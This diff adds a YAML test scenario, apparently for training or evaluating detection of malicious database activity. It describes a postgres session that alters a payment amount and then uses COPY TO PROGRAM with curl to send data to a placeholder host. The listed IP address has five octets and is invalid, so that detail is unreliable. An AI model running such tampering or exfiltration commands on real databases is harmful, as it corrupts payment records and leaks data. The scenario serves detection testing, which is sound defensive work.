@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_27_data_tamper_mal_716
+family_id: gen_ecommerce_27_data_tamper_mal_fam716
+domain: ecommerce
+time_of_day: 02:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: UPDATE payments SET amount = 332967 WHERE order_id = 97295
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://deid-partner.example/ingest
+      -d @-'
+    connects_to:
+      ip: 23.129.64.63.132
+      port: 23
